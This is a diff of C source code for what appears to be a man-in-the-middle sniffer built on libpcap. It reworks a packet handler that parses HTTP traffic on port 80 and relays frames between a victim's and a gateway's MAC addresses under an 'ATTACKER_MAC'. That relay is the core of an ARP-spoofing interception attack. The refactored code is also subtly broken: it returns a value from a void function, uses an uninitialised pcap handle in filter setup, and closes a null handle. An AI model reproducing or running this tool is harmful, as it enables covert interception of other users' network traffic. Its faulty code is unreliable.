@@ -206,92 +206,106 @@ int sniffer_init(sni_info* info,char* errbuf){
 void write_packet(u_char *user,const struct pcap_pkthdr *hp,const u_char *packet) {
 	pcap_dump(user, hp, packet);
 }
-void anylysis_packet(u_char *user,const struct pcap_pkthdr *hp ,const u_char *packet){
-	MITM_info* info = (MITM_info*)user;
+
+void anlysis_packet(int sock, void *eloop_ctx, void *sock_ctx) {
+	struct packet_handler *handler = (struct packet_handler*)sock_ctx;
+	MITM_info *info = (MITM_info*)eloop_ctx;
+	struct pcap_pkthdr hdr;
 	int header_len;
+
+	void *packet = pcap_next(handler->pcap_fd, &hdr);
+	if (!packet) return NULL;
+
 	ethernet_header* pEther = (ethernet_header*) packet;
 	header_len = sizeof(ethernet_header);
+
 	switch(ntohs(pEther->eth_type)){
-		case EPT_IPv4 :;
-			ip_header* pIpv4 = (ip_header*) (packet+header_len);
-			header_len += sizeof(ip_header);
-			tcp_header* pTcp;
-			switch (pIpv4->protocol_type){
-				case PROTOCOL_TCP : ;
-					pTcp = (tcp_header*) (packet + header_len);
-					header_len += ((pTcp->header_len_flag)>>12)*4; 
-					//the length of tcp header is not fix,if option flag is setup,
-					//the length of header can be maximun 40 bytes
-					switch(pTcp->dest_port) {
-						case 80 :;
-							http_resquest_payload payload;
-							parse_http_request(packet+header_len,&payload);
-						break;
-					}
-					switch(pTcp->sour_port) {
-						case 80 :;
-							 http_reply_payload payload;
-							 parse_http_reply(packet+header_len,&payload);
-					}
-					log_printf(MSG_INFO,IPv4STR " : %d >> " IPv4STR " : %d",IPv42STR(pIpv4->src_ip),
-						pTcp->sour_port,IPv42STR(pIpv4->dest_ip),pTcp->dest_port );
+	case EPT_IPv4 :;
+		ip_header* pIpv4 = (ip_header*) (packet+header_len);
+		header_len += sizeof(ip_header);
+		tcp_header* pTcp;
+		switch (pIpv4->protocol_type){
+		case PROTOCOL_TCP : ;
+			pTcp = (tcp_header*) (packet + header_len);
+			header_len += ((pTcp->header_len_flag)>>12)*4; 
+			//the length of tcp header is not fix,
+			//if option flag is setup,
+			//the length of header can be maximun 40 bytes
+			switch(pTcp->dest_port) {
+			case 80 :;
+				http_resquest_payload payload;
+				parse_http_request(packet+header_len,&payload);
 				break;
-				case PROTOCOL_UDP : ;
-					udp_header* pUdp = (udp_header*) (packet + header_len);
-					header_len += sizeof(udp_header);
-				break;	
 			}
-		break;
-		case EPT_ARP :;
-			arp_header* pArp = (arp_header*)(packet + header_len);
-			switch(ntohs(pArp -> option)){
-				case ARP_REQURST :
-					log_printf(MSG_INFO,"who was " MACSTR " talk to " MACSTR,
-							MAC2STR(pArp->dest_mac),MAC2STR(pArp->src_ip));
-				break;
-				case ARP_REPLY : 
-					log_printf(MSG_INFO,MACSTR " is " IPv4STR,
-							MAC2STR(pArp->src_mac),IPv42STR(pArp->src_ip));
+			switch(pTcp->sour_port) {
+			case 80 :;
+				http_reply_payload payload;
+				parse_http_reply(packet+header_len,&payload);
 			}
+			log_printf(MSG_INFO,IPv4STR " : %d >> " IPv4STR " : %d"
+					, IPv42STR(pIpv4->src_ip),pTcp->sour_port, 
+					IPv42STR(pIpv4->dest_ip), pTcp->dest_port );
 		break;
+		case PROTOCOL_UDP : ;
+			udp_header* pUdp = (udp_header*) (packet + header_len);
+			header_len += sizeof(udp_header);
+		break;	
+		}
+	break;
+	case EPT_ARP :;
+		arp_header* pArp = (arp_header*)(packet + header_len);
+		switch(ntohs(pArp -> option)){
+			case ARP_REQURST :
+				log_printf(MSG_INFO,"who was " MACSTR " talk to " MACSTR,
+						MAC2STR(pArp->dest_mac),MAC2STR(pArp->src_ip));
+			break;
+			case ARP_REPLY : 
+				log_printf(MSG_INFO,MACSTR " is " IPv4STR, 
+						MAC2STR(pArp->src_mac), IPv42STR(pArp->src_ip));
+		}
+	break;
 	}
 	if(!memcmp(pEther->SRC_mac,info->TARGET_MAC,6)){	
 		forword(info->dev,ntohs(pEther->eth_type),info->GATEWAY_MAC,info->ATTACKER_MAC,
-			packet+sizeof(ethernet_header),hp->len-sizeof(ethernet_header));
+			packet+sizeof(ethernet_header),hdr.caplen-sizeof(ethernet_header));
 	}
 	if(!memcmp(pEther->SRC_mac,info->GATEWAY_MAC,6)){
 		forword(info->dev,ntohs(pEther->eth_type),info->TARGET_MAC,info->ATTACKER_MAC,
-				packet+sizeof(ethernet_header),hp->len-sizeof(ethernet_header));
+				packet+sizeof(ethernet_header),hdr.caplen-sizeof(ethernet_header));
 	}	
 }
 
-void* capute(void* mitm_info){
+struct packet_handler* pcap_fd_init(void* mitm_info){
+	struct packet_handler *handler;
+	handler = malloc(sizeof(struct packet_handler));
+	if(!handler) PRINTF_MALLOC_ERROR;
+
 	pcap_t* handle;
 	MITM_info* info = (MITM_info*)mitm_info;
 	struct bpf_program bpf;
 	u_int netNum;
 	u_int netmask;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_lookupnet(info->dev,&netNum,&netmask,errbuf);
-	handle = pcap_open_live(info->dev,65536,1,1000,errbuf);
-	if(!handle){
-		log_printf(MSG_ERROR,"Sniffer: %s",errbuf);
-		pcap_close(handle);
+	pcap_lookupnet(info->dev, &netNum, &netmask, errbuf);
+	handler->pcap_fd = pcap_open_live(info->dev, 65536, 1, 1000, errbuf);
+	if(!handler->pcap_fd){
+		log_printf(MSG_DEBUG, "Sniffer: %s", errbuf);
+		pcap_close(handler->pcap_fd);
 		return NULL;
 	}
 
-	if(pcap_compile(handle,&bpf,info->filter,0,netmask)){
-		log_printf(MSG_ERROR,"Sniffer: %s",pcap_geterr(handle));
-		pcap_close(handle);
+	if(pcap_compile(handler->pcap_fd, &bpf,info->filter, 0, netmask)){
+		log_printf(MSG_DEBUG,"Sniffer: %s", pcap_geterr(handle));
+		pcap_close(handler->pcap_fd);
 		return NULL;
 	}
-	if(pcap_setfilter(handle,&bpf)<0){
-		log_printf(MSG_ERROR,"Sniffer: %s",pcap_geterr(handle));
-		pcap_close(handle);
+	if(pcap_setfilter(handle, &bpf)<0){
+		log_printf(MSG_DEBUG, "Sniffer: %s", pcap_geterr(handle));
+		pcap_close(handler->pcap_fd);
 		return NULL;
 	}
-	log_printf(MSG_DEBUG,"init interface successful,start to capute package");
-	if(wfile) {
+	log_printf(MSG_DEBUG, "init interface successful,start to capute package");
+	/*if(wfile) {
 		pcap_dumper_t *dumper;
 		dumper=pcap_dump_open(handle,wfile);
 		if(dumper) {
@@ -301,7 +315,9 @@ void* capute(void* mitm_info){
 		}
 	} else {
 		pcap_loop(handle,-1,anylysis_packet,(u_char*)info);
-	}
-	pcap_close(handle);
-	return 0;
+	}*/
+	
+	handler->fd =  pcap_get_selectable_fd(handler->pcap_fd);
+	return handler;
 }
+ 
